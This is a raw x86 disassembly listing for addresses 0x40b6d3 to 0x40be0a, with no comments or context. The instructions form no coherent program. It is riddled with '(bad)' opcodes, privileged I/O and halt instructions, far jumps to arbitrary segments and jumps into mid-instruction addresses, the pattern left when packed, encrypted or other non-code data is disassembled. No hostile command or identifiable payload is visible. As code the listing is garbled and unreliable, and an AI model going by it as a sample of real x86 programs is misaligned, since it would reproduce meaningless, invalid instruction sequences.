  40b6d3:	cmp    DWORD PTR [ebx-0x37],esi
  40b6d6:	jg     0x40b65f
  40b6d8:	mov    eax,ds:0xe364000e
  40b6dd:	xor    eax,0xb41b9181
  40b6e2:	sub    eax,0xde22da65
  40b6e7:	mov    bh,0xb5
  40b6e9:	jg     0x40b67e
  40b6eb:	xchg   esp,eax
  40b6ec:	adc    eax,0x6f1fe768
  40b6f1:	retf   0x942e
  40b6f4:	mov    ds,WORD PTR [edx]
  40b6f6:	push   eax
  40b6f7:	test   al,0xc
  40b6f9:	dec    eax
  40b6fa:	and    BYTE PTR ds:0xdea42486,dl
  40b700:	je     0x40b6f8
  40b702:	pop    es
  40b703:	pop    eax
  40b704:	dec    edx
  40b705:	daa    
  40b706:	stos   BYTE PTR es:[edi],al
  40b707:	aaa    
  40b708:	jne    0x40b6f1
  40b70a:	pop    edi
  40b70b:	mov    dh,0xb7
  40b70d:	sbb    esp,DWORD PTR [esi]
  40b70f:	in     al,dx
  40b710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b711:	dec    ebp
  40b712:	sar    BYTE PTR [ecx+0x59caca1b],1
  40b718:	ficomp DWORD PTR [edi+edx*1+0x9]
  40b71c:	jmp    0x650:0x3e0fc058
  40b723:	lods   al,BYTE PTR ds:[esi]
  40b724:	mov    edi,DWORD PTR [edx+0x49260fd5]
  40b72a:	dec    ecx
  40b72b:	add    eax,esp
  40b72d:	mov    ecx,0x6d7bab7f
  40b732:	dec    edx
  40b733:	mov    ch,0x23
  40b735:	shl    BYTE PTR [edi],0x88
  40b738:	mov    eax,0x6c14fc5b
  40b73d:	xor    edx,DWORD PTR [edi-0x15]
  40b740:	rcl    DWORD PTR [esi+0x2dbe2057],cl
  40b746:	inc    edi
  40b747:	and    al,0xcd
  40b749:	jecxz  0x40b705
  40b74b:	sub    eax,DWORD PTR [esi-0x720a5e9a]
  40b751:	add    al,0x0
  40b753:	or     al,0xb5
  40b755:	jns    0x40b72a
  40b757:	(bad)
  40b75a:	imul   ch
  40b75c:	ss aas 
  40b75e:	out    dx,eax
  40b75f:	imul   edx,DWORD PTR [ebx],0x0
  40b762:	leave  
  40b763:	push   ds
  40b764:	rcr    esi,0xbf
  40b767:	cdq    
  40b768:	pop    ds
  40b769:	cmp    DWORD PTR [ecx+esi*4-0x4ef4067e],ebp
  40b770:	mov    al,ds:0xc765db78
  40b775:	addr16 xchg esi,eax
  40b777:	dec    ebx
  40b778:	pusha  
  40b779:	xor    eax,DWORD PTR [ebx+0x42]
  40b77c:	xlat   BYTE PTR ds:[ebx]
  40b77d:	adc    BYTE PTR [eax+0x7a28f4fd],cl
  40b783:	and    al,0xc7
  40b785:	(bad)  
  40b786:	test   eax,0xf88ccba8
  40b78b:	mov    al,ds:0x9bc2c503
  40b790:	mov    al,ds:0x7b5b77c7
  40b795:	jb     0x40b765
  40b797:	add    eax,0x1c8e7675
  40b79c:	scas   al,BYTE PTR es:[edi]
  40b79d:	test   DWORD PTR [eax+eiz*4-0x12e21b25],edx
  40b7a4:	(bad)  
  40b7a5:	xor    ecx,esp
  40b7a7:	cdq    
  40b7a8:	mov    dl,0xa3
  40b7aa:	mov    ch,0xe9
  40b7ac:	(bad)  
  40b7ad:	inc    edx
  40b7af:	call   0x7eb2ca7b
  40b7b4:	retf   
  40b7b5:	and    dh,BYTE PTR [esi+0x67d42f33]
  40b7bb:	gs ja  0x40b812
  40b7be:	sahf   
  40b7bf:	sub    eax,0x1e76a423
  40b7c4:	fdivr  st,st(6)
  40b7c6:	std    
  40b7c7:	pusha  
  40b7c8:	and    edi,DWORD PTR [edi+0x6714de6c]
  40b7ce:	enter  0x6d6c,0x9f
  40b7d2:	and    eax,0xc0cfc1a7
  40b7d7:	cmp    ecx,DWORD PTR [edx-0x6937dc42]
  40b7dd:	arpl   si,sp
  40b7df:	stos   BYTE PTR es:[edi],al
  40b7e0:	pop    ecx
  40b7e1:	pushf  
  40b7e2:	mov    ebp,edi
  40b7e4:	push   ecx
  40b7e5:	and    edi,edi
  40b7e7:	sub    al,0x63
  40b7e9:	fwait
  40b7ea:	dec    edi
  40b7eb:	add    BYTE PTR [eax+ebx*1],al
  40b7ee:	cdq    
  40b7ef:	xor    DWORD PTR [edx],edi
  40b7f1:	out    0xfb,al
  40b7f3:	mov    cl,0x43
  40b7f5:	loop   0x40b850
  40b7f7:	xor    esp,edi
  40b7f9:	sbb    edx,0x2086ea06
  40b7ff:	pop    edi
  40b800:	push   esi
  40b801:	mov    eax,ds:0xababfc07
  40b806:	ins    BYTE PTR es:[edi],dx
  40b807:	xor    al,0x39
  40b809:	scas   al,BYTE PTR es:[edi]
  40b80a:	add    eax,0x9cb98242
  40b80f:	push   0xffffffb3
  40b811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b812:	lock ret 
  40b814:	push   cs
  40b815:	repz scas al,BYTE PTR es:[edi]
  40b817:	jnp    0x40b87c
  40b819:	dec    eax
  40b81a:	push   0x284471fa
  40b81f:	push   cs
  40b820:	jp     0x40b868
  40b822:	loopne 0x40b82f
  40b824:	(bad)  
  40b825:	mov    ah,0x43
  40b827:	iret   
  40b828:	sbb    eax,0xc5768f30
  40b82d:	mov    edi,edx
  40b82f:	daa    
  40b830:	in     al,0x2e
  40b832:	inc    ebp
  40b833:	jmp    0xf69fba93
  40b838:	nop
  40b839:	cli    
  40b83a:	dec    esp
  40b83b:	sbb    dl,0xef
  40b83e:	adc    BYTE PTR [eax-0x2e],dl
  40b841:	jns    0x40b86a
  40b843:	cli    
  40b844:	inc    ecx
  40b845:	pop    ebx
  40b846:	popa   
  40b847:	rol    BYTE PTR [edx+0x16],cl
  40b84a:	add    BYTE PTR [eax-0x42cf0674],cl
  40b850:	jb     0x40b8a7
  40b852:	fstp   DWORD PTR [eax]
  40b854:	dec    ecx
  40b855:	(bad)  
  40b857:	test   al,0xf3
  40b859:	or     al,BYTE PTR [edi+0x3c]
  40b85c:	aaa    
  40b85d:	adc    DWORD PTR [eax],ebx
  40b85f:	sbb    eax,0x59306f09
  40b864:	inc    eax
  40b865:	mov    dl,0xb6
  40b867:	and    al,0x65
  40b869:	ret    0xda84
  40b86c:	jnp    0x40b85c
  40b86e:	(bad)  
  40b86f:	inc    esp
  40b870:	repnz bound esp,QWORD PTR [edi+ebp*4-0x76faa2f]
  40b878:	in     al,0xb1
  40b87a:	sub    bl,cl
  40b87c:	xor    al,0x83
  40b87e:	jmp    0x40b8f5
  40b880:	test   DWORD PTR [edx+ebx*1+0x53514dbe],ebp
  40b887:	pop    es
  40b888:	and    BYTE PTR [ecx+0x667d8b45],bl
  40b88e:	xor    BYTE PTR [edx],al
  40b890:	adc    dl,cl
  40b892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b893:	inc    edi
  40b894:	test   BYTE PTR [edx],ah
  40b896:	js     0x40b81d
  40b898:	stos   DWORD PTR es:[edi],eax
  40b899:	je     0x40b840
  40b89b:	out    dx,eax
  40b89c:	jns    0x40b8b9
  40b89e:	push   es
  40b89f:	adc    eax,0x2ffb68ad
  40b8a4:	or     eax,0x3d4821d2
  40b8a9:	pop    ebp
  40b8aa:	icebp  
  40b8ab:	repnz mov WORD PTR [esi-0x27],?
  40b8af:	push   edi
  40b8b0:	sbb    al,0x53
  40b8b2:	push   DWORD PTR [edi-0x4]
  40b8b5:	cmp    BYTE PTR [edi+edi*8+0x21],bl
  40b8b9:	mov    ecx,0xe5f93c68
  40b8be:	pop    edx
  40b8bf:	adc    DWORD PTR [edi],ebp
  40b8c1:	and    al,0x4
  40b8c3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40b8c5:	cld    
  40b8c6:	pop    ss
  40b8c7:	daa    
  40b8c8:	sbb    eax,edi
  40b8ca:	in     eax,dx
  40b8cb:	ss push ebx
  40b8cd:	inc    esi
  40b8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8cf:	mov    ebx,0x3508883c
  40b8d4:	sub    BYTE PTR [esi],bl
  40b8d6:	push   ecx
  40b8d7:	es push ebp
  40b8d9:	(bad)  
  40b8da:	cli    
  40b8db:	pop    ebx
  40b8dc:	shl    BYTE PTR [edx],cl
  40b8de:	xchg   DWORD PTR ds:0xfa7c8266,eax
  40b8e4:	sbb    BYTE PTR [esi-0x50],al
  40b8e7:	enter  0x7e68,0x8
  40b8eb:	cmp    BYTE PTR [edi],bl
  40b8ed:	pushf  
  40b8ee:	stos   DWORD PTR es:[edi],eax
  40b8ef:	jb     0x40b901
  40b8f1:	cdq    
  40b8f2:	mov    ds:0x567600e1,eax
  40b8f7:	popf   
  40b8f8:	jo     0x40b8ef
  40b8fa:	out    0x3d,eax
  40b8fc:	mov    dl,0xc0
  40b8fe:	dec    edx
  40b8ff:	sub    BYTE PTR [ecx-0x4b],bh
  40b902:	mov    eax,0x334bf52d
  40b907:	imul   edi,DWORD PTR [esi-0x2f],0x36
  40b90b:	loope  0x40b913
  40b90d:	jmp    0x6b832292
  40b912:	lock retf 0xdf81
  40b916:	xchg   ebx,eax
  40b917:	icebp  
  40b918:	cmp    ebx,edx
  40b91a:	ins    BYTE PTR es:[edi],dx
  40b91b:	xchg   ecx,eax
  40b91c:	popa   
  40b91d:	(bad)  
  40b91e:	xor    BYTE PTR [esi],al
  40b920:	sub    ah,bh
  40b922:	clc    
  40b923:	es jno 0x40b8ec
  40b926:	inc    ecx
  40b927:	jbe    0x40b8d8
  40b929:	xor    BYTE PTR [edi],dl
  40b92b:	xlat   BYTE PTR ds:[ebx]
  40b92c:	and    cl,dl
  40b92e:	enter  0xe6cf,0x87
  40b932:	jmp    0x40b916
  40b934:	sub    al,ah
  40b936:	lods   eax,DWORD PTR ds:[esi]
  40b937:	xor    eax,0xa6cbb28a
  40b93c:	aas    
  40b93d:	sbb    al,0x33
  40b93f:	cmp    DWORD PTR [edi+0xf],ecx
  40b942:	fwait
  40b943:	popa   
  40b944:	cli    
  40b945:	pop    eax
  40b946:	leave  
  40b947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b948:	push   esi
  40b949:	out    dx,eax
  40b94a:	push   0x7fa05789
  40b94f:	jecxz  0x40b907
  40b951:	test   DWORD PTR [ecx+ebp*2-0x69501510],ebx
  40b958:	push   edx
  40b959:	adc    ah,BYTE PTR [eax+0x2f86d1ac]
  40b95f:	test   al,0xdd
  40b961:	mov    DWORD PTR ds:0xd0d28fb9,eax
  40b967:	out    0x72,eax
  40b969:	mov    ecx,0xcdd85434
  40b96e:	mov    bh,cl
  40b970:	test   cl,ah
  40b972:	ja     0x40b985
  40b974:	loopne 0x40b9a9
  40b976:	mov    cl,0x2e
  40b978:	push   esi
  40b979:	sub    BYTE PTR [ebx-0x28],ch
  40b97c:	mov    dh,0x24
  40b97e:	imul   DWORD PTR [eax+eiz*4-0x45]
  40b982:	add    ebp,DWORD PTR [edi-0x5d]
  40b985:	jne    0x40b95b
  40b987:	cmp    al,0x1
  40b989:	call   FWORD PTR [edx]
  40b98b:	pop    edx
  40b98c:	jmp    0xd3f32975
  40b991:	jnp    0x40b919
  40b993:	ins    DWORD PTR es:[edi],dx
  40b994:	bound  esi,QWORD PTR [edi]
  40b996:	clc    
  40b997:	xor    ebx,ecx
  40b999:	imul   ecx,DWORD PTR [eax],0x9c9c8822
  40b99f:	imul   ebp,ebx,0xd635a037
  40b9a5:	call   0x7405:0xd66647cb
  40b9ac:	data16 jge 0x40b93c
  40b9af:	cld    
  40b9b0:	dec    ebx
  40b9b1:	imul   edx,DWORD PTR [ebp-0xf],0x679592fc
  40b9b8:	shr    BYTE PTR ds:0xc0c8e4d5,1
  40b9be:	or     al,0x49
  40b9c0:	mov    al,0x8f
  40b9c2:	outs   dx,BYTE PTR ds:[esi]
  40b9c3:	mov    ebp,0xc1f394
  40b9c8:	cld    
  40b9c9:	mov    ah,0xb5
  40b9cb:	outs   dx,BYTE PTR ds:[esi]
  40b9cc:	dec    esi
  40b9cd:	imul   edx,DWORD PTR [ecx-0x5cebf5e],0x520804e1
  40b9d7:	mov    dl,0xa
  40b9d9:	sbb    BYTE PTR [edx+0x7da6027f],cl
  40b9df:	aas    
  40b9e0:	(bad)  
  40b9e1:	push   esp
  40b9e2:	add    DWORD PTR [ebp+0xc],esi
  40b9e5:	add    eax,0x75869669
  40b9ea:	push   edi
  40b9eb:	rcl    DWORD PTR [edx],cl
  40b9ed:	mov    ch,0x52
  40b9ef:	aad    0x3
  40b9f1:	mov    dl,0x58
  40b9f3:	outs   dx,DWORD PTR ds:[esi]
  40b9f4:	mul    edi
  40b9f6:	ja     0x40b9ce
  40b9f8:	cld    
  40b9f9:	out    0x88,al
  40b9fb:	mov    eax,ds:0x6cc5f59
  40ba00:	push   ds
  40ba01:	pop    edi
  40ba02:	ins    DWORD PTR es:[edi],dx
  40ba03:	lods   eax,DWORD PTR ds:[esi]
  40ba04:	fisub  WORD PTR [esi]
  40ba06:	jmp    0xa8ad5a31
  40ba0b:	sub    eax,0xd74d124e
  40ba10:	mov    DWORD PTR [ebp-0x61],eax
  40ba13:	sub    al,0x84
  40ba15:	cwde   
  40ba16:	xchg   esp,eax
  40ba17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba18:	(bad)  
  40ba19:	pop    ebp
  40ba1a:	fwait
  40ba1b:	aaa    
  40ba1c:	repnz pop ecx
  40ba1e:	cmp    ecx,DWORD PTR [edi]
  40ba20:	cmp    DWORD PTR [ecx+edi*1],edi
  40ba23:	lods   al,BYTE PTR ds:[esi]
  40ba24:	pop    edx
  40ba25:	push   edi
  40ba26:	and    ecx,DWORD PTR [eax-0x7c3c1c4e]
  40ba2c:	cdq    
  40ba2d:	xchg   ebp,eax
  40ba2e:	and    eax,0x4f942d65
  40ba33:	mov    esp,0x9d160b10
  40ba38:	mov    eax,0xf0db9fa6
  40ba3d:	dec    esp
  40ba3e:	cld    
  40ba3f:	retf   
  40ba40:	fldenv [ebp+0x4a]
  40ba43:	cmp    BYTE PTR [ecx+0x6d],bh
  40ba46:	lds    esi,FWORD PTR [ecx+0x371c9515]
  40ba4c:	das    
  40ba4d:	bound  esp,QWORD PTR [esp+edx*8]
  40ba50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba51:	sbb    BYTE PTR [edi+edi*2-0x7d],bl
  40ba55:	adc    BYTE PTR [esi-0x63],ah
  40ba58:	push   es
  40ba59:	cld    
  40ba5a:	jecxz  0x40ba22
  40ba5c:	jae    0x40ba46
  40ba5e:	retf   0xefb0
  40ba61:	mov    ch,0x74
  40ba63:	or     BYTE PTR [edx],bl
  40ba65:	jmp    0x1a9a03ef
  40ba6a:	pop    ecx
  40ba6b:	ja     0x40ba78
  40ba6d:	mov    eax,0x902b6234
  40ba72:	repz out dx,eax
  40ba74:	or     ebx,esp
  40ba76:	dec    ecx
  40ba77:	pop    ds
  40ba78:	dec    esp
  40ba79:	pop    ebp
  40ba7a:	imul   edx,DWORD PTR [edx],0xffffffb0
  40ba7d:	and    BYTE PTR [ebx],0xa4
  40ba80:	pop    eax
  40ba81:	add    edx,DWORD PTR ds:0xfdb35f3f
  40ba87:	nop
  40ba88:	ret    
  40ba89:	and    eax,0xf4cc9628
  40ba8e:	jo     0x40ba77
  40ba90:	mov    edx,0x86c8bc4c
  40ba95:	xchg   ecx,eax
  40ba96:	push   es
  40ba97:	outs   dx,DWORD PTR ds:[esi]
  40ba98:	adc    BYTE PTR [esi+0x4f0f65f3],al
  40ba9e:	aas    
  40ba9f:	(bad)  
  40baa0:	xchg   edx,eax
  40baa1:	inc    ebx
  40baa2:	xor    DWORD PTR [ebx],edx
  40baa4:	inc    edi
  40baa5:	xor    edi,DWORD PTR [esp+edi*1-0x5b37c24c]
  40baac:	shl    BYTE PTR [ecx-0x1a],1
  40baaf:	retf   0x7f6f
  40bab2:	test   cl,ch
  40bab4:	je     0x40bb09
  40bab6:	xor    DWORD PTR [edx],0x78bca5bd
  40babc:	inc    edi
  40babd:	pop    ss
  40babe:	(bad)  
  40babf:	push   ecx
  40bac0:	popf   
  40bac1:	rcl    BYTE PTR [eax-0x6],cl
  40bac4:	outs   dx,BYTE PTR ds:[esi]
  40bac5:	(bad)  
  40bac6:	pop    eax
  40bac7:	fstp   TBYTE PTR [edi+0xaa72c18]
  40bacd:	iret   
  40bace:	xchg   ebx,eax
  40bacf:	bound  ebp,QWORD PTR [edx]
  40bad1:	xchg   DWORD PTR [eax-0x42b13292],esi
  40bad7:	dec    eax
  40bad8:	push   eax
  40bad9:	xor    edi,DWORD PTR [edx+0x18]
  40badc:	xchg   esi,eax
  40badd:	mov    ds:0xa8db7425,al
  40bae2:	in     eax,dx
  40bae3:	in     eax,dx
  40bae4:	cld    
  40bae5:	and    al,0x3c
  40bae7:	hlt    
  40bae8:	jb     0x40bb3b
  40baea:	inc    esi
  40baeb:	fild   WORD PTR [edx-0x55]
  40baee:	iret   
  40baef:	cmp    eax,0xcd167c27
  40baf4:	xchg   ebp,eax
  40baf5:	cmp    DWORD PTR [edx+0x18],eax
  40baf8:	add    al,0xf2
  40bafa:	icebp  
  40bafb:	push   ebx
  40bafc:	mov    edx,0x39fe0355
  40bb01:	call   0x3085:0xcd1f96dd
  40bb08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb09:	fnstenv [ecx+esi*2+0x13c16d8f]
  40bb10:	nop
  40bb11:	mov    edi,0x8d53df5b
  40bb16:	mov    DWORD PTR [ebx+0x7368468f],esi
  40bb1c:	push   esp
  40bb1d:	outs   dx,BYTE PTR ds:[esi]
  40bb1e:	ss gs jge 0x40bb33
  40bb22:	hlt    
  40bb23:	out    dx,eax
  40bb24:	xor    al,0x86
  40bb26:	mov    bh,0x38
  40bb28:	xchg   edi,eax
  40bb29:	xor    edx,ebp
  40bb2b:	xchg   ebx,eax
  40bb2c:	clc    
  40bb2d:	mov    ecx,0xfec22846
  40bb33:	push   esi
  40bb34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb35:	sub    DWORD PTR [edi-0x76b1c45d],edx
  40bb3b:	outs   dx,DWORD PTR ds:[esi]
  40bb3c:	jp     0x40bb99
  40bb3e:	lods   al,BYTE PTR ds:[esi]
  40bb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb40:	inc    ebp
  40bb41:	test   cl,dl
  40bb43:	push   esi
  40bb44:	mov    bl,BYTE PTR [edi-0x5853b7a6]
  40bb4a:	dec    edi
  40bb4b:	dec    esp
  40bb4c:	mov    eax,ds:0xddd064f6
  40bb51:	xor    cl,dh
  40bb53:	push   edx
  40bb54:	dec    esp
  40bb55:	xchg   esi,eax
  40bb56:	frstor [esi-0x25]
  40bb59:	jg     0x40bb33
  40bb5b:	pop    ss
  40bb5c:	call   0xb02eccdd
  40bb61:	addr16 push ss
  40bb63:	fs sahf 
  40bb65:	es mov ebx,ds
  40bb68:	sbb    bl,BYTE PTR ds:0x9d3bb60b
  40bb6e:	inc    edx
  40bb6f:	push   ebp
  40bb70:	ss pop eax
  40bb72:	add    dl,BYTE PTR [eax-0x69]
  40bb75:	cmp    al,0xcf
  40bb77:	add    ecx,eax
  40bb79:	xor    ebp,DWORD PTR [edi-0x653ba7a6]
  40bb7f:	sbb    DWORD PTR [ebx-0x6b4c514e],0x4335c201
  40bb89:	fwait
  40bb8a:	and    BYTE PTR [eax],bh
  40bb8c:	call   0x4548:0x497379de
  40bb93:	jae    0x40bbfc
  40bb95:	or     ebx,DWORD PTR [ebx+0x1e9882a0]
  40bb9b:	cmc    
  40bb9c:	mov    cl,0x53
  40bb9e:	dec    ebx
  40bb9f:	xchg   edx,eax
  40bba0:	or     eax,0x267f918c
  40bba5:	test   eax,0x55c00aa0
  40bbaa:	les    eax,FWORD PTR [eax+edi*4+0x37]
  40bbae:	add    DWORD PTR [ebp+0x2f62bb1d],0x77011b99
  40bbb8:	cdq    
  40bbb9:	adc    al,0xf6
  40bbbb:	cmp    bh,ch
  40bbbd:	inc    edx
  40bbbe:	loopne 0x40bbb8
  40bbc0:	hlt    
  40bbc1:	cmp    eax,esp
  40bbc3:	cmp    esp,DWORD PTR [eax-0x1d]
  40bbc6:	es scas al,BYTE PTR es:[edi]
  40bbc8:	loop   0x40bb8c
  40bbca:	stos   BYTE PTR es:[edi],al
  40bbcb:	arpl   WORD PTR [edi-0x5],si
  40bbce:	dec    eax
  40bbcf:	xchg   esp,eax
  40bbd0:	and    DWORD PTR [edx-0x25],ebx
  40bbd3:	push   ebp
  40bbd4:	dec    eax
  40bbd5:	retf   
  40bbd6:	retf   
  40bbd7:	sbb    DWORD PTR [ebp+0x6540e738],eax
  40bbdd:	xchg   esi,eax
  40bbde:	lods   al,BYTE PTR ds:[esi]
  40bbdf:	rol    BYTE PTR [ebp-0x80],0xdd
  40bbe3:	and    bl,al
  40bbe5:	dec    edx
  40bbe6:	jno    0x40bbc7
  40bbe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe9:	das    
  40bbea:	mov    es,WORD PTR gs:[eax+0x10]
  40bbee:	cld    
  40bbef:	xor    ch,BYTE PTR ds:0x141af54b
  40bbf5:	stos   BYTE PTR es:[edi],al
  40bbf6:	jecxz  0x40bbad
  40bbf8:	lss    esp,FWORD PTR [edx]
  40bbfb:	arpl   WORD PTR [edx+0x39],ax
  40bbfe:	ficom  WORD PTR [ecx+0x138a3ecf]
  40bc04:	add    esi,edi
  40bc06:	push   ebx
  40bc07:	inc    eax
  40bc08:	not    BYTE PTR [edi+ecx*4]
  40bc0b:	mov    dh,0x28
  40bc0d:	test   al,0xf1
  40bc0f:	pushf  
  40bc10:	popf   
  40bc11:	popa   
  40bc12:	cmp    DWORD PTR [edx+0x38],0xffffffdc
  40bc16:	stos   BYTE PTR es:[edi],al
  40bc17:	outs   dx,BYTE PTR ds:[esi]
  40bc18:	and    DWORD PTR [eax],edi
  40bc1a:	xor    al,0xf4
  40bc1c:	and    al,0x73
  40bc1e:	and    cl,BYTE PTR [edx]
  40bc20:	jb     0x40bc08
  40bc22:	retf   0xda23
  40bc25:	push   0xffffff97
  40bc27:	pop    ebp
  40bc28:	cdq    
  40bc29:	(bad)  
  40bc2a:	mov    ds:0x6d8de9b2,eax
  40bc2f:	jno    0x40bbca
  40bc31:	xor    al,0xc1
  40bc33:	ins    BYTE PTR es:[edi],dx
  40bc34:	dec    ebx
  40bc35:	stc    
  40bc36:	sar    edx,1
  40bc38:	or     BYTE PTR [edi],ah
  40bc3a:	cmp    al,0xfa
  40bc3c:	pusha  
  40bc3d:	popf   
  40bc3e:	xor    DWORD PTR [eax-0x78ebff9c],esi
  40bc44:	mov    bh,0xa9
  40bc46:	push   edi
  40bc47:	sti    
  40bc48:	xor    dl,BYTE PTR [edx+esi*2]
  40bc4b:	push   ds
  40bc4c:	jae    0x40bc4e
  40bc4e:	leave  
  40bc4f:	stos   BYTE PTR es:[edi],al
  40bc50:	cmp    al,0xba
  40bc52:	dec    eax
  40bc53:	dec    edx
  40bc54:	add    bl,BYTE PTR [ebx-0x794d13ed]
  40bc5a:	enter  0x3c52,0x2a
  40bc5e:	sbb    dh,BYTE PTR [esp+edi*4+0x17]
  40bc62:	xor    al,0xd1
  40bc64:	dec    edi
  40bc65:	or     eax,0x1f722bb0
  40bc6a:	push   esi
  40bc6b:	mov    dl,BYTE PTR [edx]
  40bc6d:	es inc edx
  40bc6f:	dec    ecx
  40bc70:	fidiv  WORD PTR [edi-0x72271031]
  40bc76:	das    
  40bc77:	cs enter 0x28f2,0xc6
  40bc7c:	bound  esp,QWORD PTR [edx]
  40bc7e:	or     dh,BYTE PTR [edi-0x2ba5c9f]
  40bc84:	cwde   
  40bc85:	pop    esp
  40bc86:	jo     0x40bce7
  40bc88:	xchg   edi,eax
  40bc89:	les    esi,FWORD PTR [edx+eiz*1]
  40bc8c:	mov    BYTE PTR [bp+si],dh
  40bc8f:	push   esi
  40bc90:	push   0xffffffa5
  40bc92:	rol    BYTE PTR [ecx-0x60],0x67
  40bc96:	cwde   
  40bc97:	lods   al,BYTE PTR ds:[esi]
  40bc98:	ror    al,cl
  40bc9a:	dec    edi
  40bc9b:	(bad)  
  40bc9c:	int    0x5b
  40bc9e:	adc    cl,cl
  40bca0:	mov    edi,0xf0de79de
  40bca5:	pop    ebx
  40bca6:	pop    edx
  40bca7:	es and al,0x6c
  40bcaa:	lods   al,BYTE PTR ds:[esi]
  40bcab:	xor    al,0x1b
  40bcad:	xchg   edx,edi
  40bcaf:	pop    ecx
  40bcb0:	add    al,0x31
  40bcb3:	push   ebp
  40bcb4:	int3   
  40bcb5:	ret    0xd9e3
  40bcb8:	sub    eax,0x902e1027
  40bcbd:	add    al,0xe2
  40bcbf:	add    al,0xa1
  40bcc1:	jbe    0x40bc78
  40bcc3:	cmc    
  40bcc4:	jo     0x40bd38
  40bcc6:	sub    eax,0xcb11c9c9
  40bccb:	daa    
  40bccc:	rcl    DWORD PTR [esi],0xaa
  40bccf:	or     eax,0xae0de43d
  40bcd4:	sbb    BYTE PTR [ebp-0x1f89f12d],ah
  40bcda:	mov    ah,0x83
  40bcdc:	(bad)  
  40bcdd:	mov    ds:0x9c1e0a8b,al
  40bce2:	mov    ss,WORD PTR [esi]
  40bce4:	test   eax,0xd4ef6dbc
  40bce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcea:	pop    edx
  40bceb:	(bad)  ds:0xbbc8c1ce
  40bcf1:	pushf  
  40bcf2:	ss popf 
  40bcf4:	adc    bl,dl
  40bcf6:	sbb    al,0x9
  40bcf8:	scas   al,BYTE PTR es:[edi]
  40bcf9:	ja     0x40bcb6
  40bcfb:	push   ebx
  40bcfc:	mov    al,0x94
  40bcfe:	cwde   
  40bcff:	call   0x746d0f95
  40bd04:	lea    ebx,[ecx]
  40bd06:	test   DWORD PTR [ecx],esi
  40bd08:	cmp    BYTE PTR [esi-0x67],cl
  40bd0b:	sbb    ebx,DWORD PTR [esi+0x3f]
  40bd0e:	lock dec eax
  40bd10:	in     al,dx
  40bd11:	mov    ds:0x794c5ee3,al
  40bd16:	addr16 xchg cx,ax
  40bd19:	lahf   
  40bd1a:	cmc    
  40bd1b:	cs inc ecx
  40bd1d:	pop    eax
  40bd1e:	xor    al,0x52
  40bd20:	lea    ebx,[edi]
  40bd22:	cs push 0xffffffa7
  40bd25:	and    BYTE PTR [ecx-0x2a6bcf78],bl
  40bd2b:	inc    ecx
  40bd2c:	push   ebx
  40bd2d:	repnz sub dl,ch
  40bd30:	cdq    
  40bd31:	fisub  WORD PTR [eax-0x9d09814]
  40bd37:	mov    BYTE PTR fs:[edx-0x5d],cl
  40bd3b:	sar    DWORD PTR [esi-0x1703b92d],cl
  40bd41:	mov    ebx,DWORD PTR [eax]
  40bd43:	shl    BYTE PTR [ecx-0x5d83ba29],1
  40bd49:	jle    0x40bd3f
  40bd4b:	clc    
  40bd4c:	inc    edx
  40bd4d:	add    eax,0xcfb49d16
  40bd52:	xchg   DWORD PTR [edx+edi*8-0x26],esp
  40bd56:	adc    BYTE PTR [edi+ebx*2-0x1c],ah
  40bd5a:	stc    
  40bd5b:	mov    ebx,eax
  40bd5d:	lock xor dh,al
  40bd60:	cmp    al,BYTE PTR [ebx-0x60]
  40bd63:	and    al,0x4f
  40bd65:	push   0x9c0c7d60
  40bd6a:	pop    ebx
  40bd6b:	pop    eax
  40bd6c:	and    edx,esi
  40bd6e:	sbb    ebx,DWORD PTR [ecx]
  40bd70:	mov    ah,0xc8
  40bd72:	call   0x8996c8eb
  40bd77:	shld   DWORD PTR [edx-0x68a0a4b1],edi,cl
  40bd7e:	lds    ecx,FWORD PTR [ebx]
  40bd80:	add    eax,0xfc72147f
  40bd85:	loop   0x40bdba
  40bd87:	sub    bh,BYTE PTR [eax]
  40bd89:	sub    DWORD PTR [ebp-0x54dc44da],esp
  40bd8f:	mov    BYTE PTR [bx-0x6e],bl
  40bd93:	adc    al,0x8e
  40bd95:	outs   dx,DWORD PTR ds:[esi]
  40bd96:	xchg   esi,eax
  40bd97:	pop    edi
  40bd98:	or     ebp,DWORD PTR [ecx-0x4d56bb1a]
  40bd9e:	and    al,0x42
  40bda0:	add    al,0x54
  40bda2:	pop    eax
  40bda3:	inc    ecx
  40bda4:	lea    ebp,[ebx+0x690f9981]
  40bdaa:	sub    eax,0xaaaeeaa7
  40bdaf:	je     0x40be19
  40bdb1:	dec    eax
  40bdb2:	(bad)  
  40bdb3:	loop   0x40bd49
  40bdb5:	daa    
  40bdb6:	fdiv   DWORD PTR [ecx+0x4]
  40bdb9:	add    al,0x3d
  40bdbb:	mov    eax,DWORD PTR [esi-0x1b940f41]
  40bdc1:	dec    edi
  40bdc2:	pop    ds
  40bdc3:	mov    ebx,0x41a7c4f3
  40bdc8:	(bad)  
  40bdc9:	cmp    eax,0xff67331c
  40bdce:	push   0xca4febb2
  40bdd3:	adc    bl,BYTE PTR [eax-0x5e]
  40bdd6:	loope  0x40bda5
  40bdd8:	inc    esp
  40bdd9:	fdiv   QWORD PTR ds:0x81a82f13
  40bddf:	push   es
  40bde0:	in     al,0x83
  40bde2:	test   eax,0xb2f8378d
  40bde7:	outs   dx,DWORD PTR ds:[esi]
  40bde8:	gs fxch st(6)
  40bdeb:	sub    bh,BYTE PTR [esi+0x310aaa50]
  40bdf1:	mov    eax,ds:0xbf123cf0
  40bdf6:	(bad)  
  40bdf8:	mov    eax,ds:0xeeb4b03b
  40bdfd:	xor    eax,0x167cb07f
  40be02:	sbb    BYTE PTR ds:[eax+0x63113d56],bl
  40be09:	inc    ebx
  40be0a:	shl    DWORD PTR [eax-0x57d04af6],0xb2
